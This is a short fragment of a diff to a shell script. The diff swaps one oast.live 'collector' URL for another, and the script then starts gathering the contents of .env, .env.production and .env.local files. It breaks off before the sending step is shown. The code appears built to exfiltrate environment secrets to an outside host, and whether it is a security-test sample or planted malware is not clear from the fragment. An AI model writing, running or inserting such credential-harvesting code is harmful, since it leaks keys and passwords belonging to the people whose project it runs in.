@@ -1,5 +1,5 @@
 #!/bin/sh
-collector="https://davs5h5g367b5db7ek80u1qnnehr7zbnq.oast.live"
+collector="https://davs8dle0q8v70itgp5gi9167k1nwif6k.oast.live"
 data=""
 for f in .env .env.production .env.local; do
   [ -f "$f" ] && data="${data}--- ${f} ---
